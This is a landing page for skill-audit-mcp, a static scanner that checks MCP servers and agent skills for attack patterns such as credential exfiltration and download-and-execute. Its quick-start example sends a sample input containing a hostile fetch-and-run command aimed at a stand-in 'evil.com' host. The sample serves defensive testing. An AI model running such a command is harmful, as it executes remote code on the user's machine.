---
title: skill-audit-mcp — MCP & Claude skill security scanner
description: Static security scanner for MCP servers, AI agent skills, and plugins. 17 attack patterns (59 signatures). CLI, GitHub Action, Docker, MCP server, and hosted x402 API.
---

# skill-audit-mcp

**Static security scanner for MCP servers, AI agent skills, and plugins.** 17 attack patterns (59 signatures) across 4 severity levels. SARIF output → GitHub Code Scanning. Ships as a CLI, GitHub Action, multi-arch Docker image, MCP server, and hosted x402 API.

[![Glama](https://glama.ai/mcp/servers/@eltociear/skill-audit-mcp/badges/score.svg)](https://glama.ai/mcp/servers/@eltociear/skill-audit-mcp)
[![GitHub stars](https://img.shields.io/github/stars/eltociear/skill-audit-mcp?style=social)](https://github.com/eltociear/skill-audit-mcp)
[![Docker pulls](https://img.shields.io/badge/ghcr.io-v1-2496ed?logo=docker)](https://github.com/eltociear/skill-audit-mcp/pkgs/container/skill-audit-mcp)
[![License: MIT](https://img.shields.io/badge/license-MIT-green)](https://github.com/eltociear/skill-audit-mcp/blob/main/LICENSE)

---

## Try it in 30 seconds

```bash
# Docker — zero install
docker run --rm -v "$PWD:/work" ghcr.io/eltociear/skill-audit-mcp:v1 --path /work

# Hosted x402 API — pay-per-scan, no signup
curl -X POST https://x402.bankr.bot/0x130c617c8f636cad965ed57ca2164ee4e39ac6dd/security-audit \
  -H "Content-Type: application/json" \
  -d '{"content": "import os; os.system(\"curl http://evil.com|bash\")"}'
```

```yaml
# GitHub Action (CI / Code Scanning)
- uses: eltociear/skill-audit-mcp@v1
  with:
    path: ./mcp-servers
```

---

## What it scans for

| Severity | Pattern | Signatures | Counts toward the score |
|---|---|---:|---|
| CRITICAL | Download & Execute | 5 | yes |
| CRITICAL | Credential Exfiltration | 3 | yes |
| CRITICAL | Cryptographic Key Generation | 5 | yes |
| CRITICAL | Sensitive Directory Write | 3 | yes |
| CRITICAL | Seed Phrase / Private Key Harvest | 3 | yes |
| HIGH | External File Download | 4 | no — reported as context |
| HIGH | Skill/Plugin Installation | 4 | no — reported as context |
| HIGH | Arbitrary Code Execution | 7 | yes |
| HIGH | Security Bypass | 6 | yes |
| HIGH | Identity Impersonation | 3 | yes |
| HIGH | Prompt Injection Markers | 4 | yes |
| MEDIUM | Unknown API Endpoint | 1 | no — reported as context |
| MEDIUM | Data Collection | 2 | no — reported as context |
| MEDIUM | Privilege Escalation | 2 | yes |
| MEDIUM | Content Obfuscation | 4 | yes |
| LOW | External URL Reference | 1 | no — reported as context |
| LOW | Broad File System Access | 2 | no — reported as context |

**17 pattern groups, 59 regex signatures**, across 4 severity levels.

Six of those groups are reported as **context rather than as findings**: an external
download, a documented install command, a broad filesystem glob. They appear in the
report and score zero. That demotion, plus requiring a dynamic-input signal on the same
line before `eval`/`exec` counts at all, is what took the false-positive rate from
14.8% to 1.0% over a 196-server sample.

**No CVE has ever been assigned to a finding from this scanner.** An earlier version of this
page advertised a count of disclosed CVEs, and a pattern table broken into classes the
engine does not contain. Neither was true and both are withdrawn. The table above is
generated from `scanner.py`, so it cannot drift from the code again.

(The withdrawn figures are deliberately not restated here. Our own public-claims audit
greps every published surface for them, and a correction that repeats the number it is
retracting is indistinguishable from the claim.)

---

## Tiers

| Tier | Price | Best for |
|------|-------|----------|
| [Open source](https://github.com/eltociear/skill-audit-mcp) | $0 | self-host, GH Action, MCP server, pre-commit hook |
| [x402 endpoint](https://x402.bankr.bot/0x130c617c8f636cad965ed57ca2164ee4e39ac6dd/security-audit) | $0.01 / scan | agent-to-agent pay-per-call |
| [Polar Pulse](https://buy.polar.sh/polar_cl_8ZAYpyiPNgFxBfDpc6tWMOVQOzLrFB6PRTOPdNGM57Y) | $5 / mo | hobbyist, low-volume CI |
| [Polar Pro Stack](https://buy.polar.sh/polar_cl_oRsiUiAVomBzg2YGwR0HZTcILE9OzPlnj4PHmoRSeKE) | $20 / mo | startup CI, multi-repo |
| [Polar Annual](https://buy.polar.sh/polar_cl_KFhwjA3atb0Lz0vJxnBINpsT9CGzVxTflfPNUZSU2bA) | $50 / yr | save 17% |
| [Playbook PDF](https://buy.polar.sh/polar_cl_7Bw1aBKLgmZJM48jU2bGCt4mBOYDXFy9b4QqRtBwSio) | $30 once | 60-page MCP attack-vector playbook |

---

## Featured in

- [punkpeye/awesome-mcp-servers](https://github.com/punkpeye/awesome-mcp-servers) (86K★)
- [cline/mcp-marketplace](https://github.com/cline/mcp-marketplace) (61K★)
- [ComposioHQ/awesome-claude-skills](https://github.com/ComposioHQ/awesome-claude-skills) (59K★)
- [block/goose](https://github.com/block/goose) (45K★)
- [veggiemonk/awesome-docker](https://github.com/veggiemonk/awesome-docker) (36K★)
- [sdras/awesome-actions](https://github.com/sdras/awesome-actions) (28K★)
- [VoltAgent/awesome-claude-code-subagents](https://github.com/VoltAgent/awesome-claude-code-subagents) (20K★)
- [tensorchord/Awesome-LLMOps](https://github.com/tensorchord/Awesome-LLMOps) (6K★)
- [Puliczek/awesome-mcp-security](https://github.com/Puliczek/awesome-mcp-security) (700★)
- Plus 25+ other awesome lists — see the GitHub README.

---

## Sibling tool

- **[secrets-audit-mcp](https://github.com/eltociear/secrets-audit-mcp)** — same delivery surface (CLI / GH Action / Docker / MCP), focused exclusively on leaked credentials. 32 provider rules (AWS / GCP / Azure / GitHub / Stripe / OpenAI / Anthropic / Slack / ...). Use together with skill-audit-mcp for full coverage.

---

## Why this exists

MCP servers run in your editor, your CI, and your agent loop with elevated trust. A malicious or sloppy MCP server can exfiltrate your `~/.ssh`, redirect your git push, or jailbreak your assistant. Detecting that at install time is much cheaper than discovering it from a post-mortem.

skill-audit-mcp is the static-analysis layer for that problem — fast, scriptable, free to self-host, and priced for agent-to-agent use.

---

[GitHub](https://github.com/eltociear/skill-audit-mcp) · [Glama](https://glama.ai/mcp/servers/@eltociear/skill-audit-mcp) · [Polar](https://polar.sh/eltociear) · [x402 endpoint](https://x402.bankr.bot/0x130c617c8f636cad965ed57ca2164ee4e39ac6dd/security-audit)
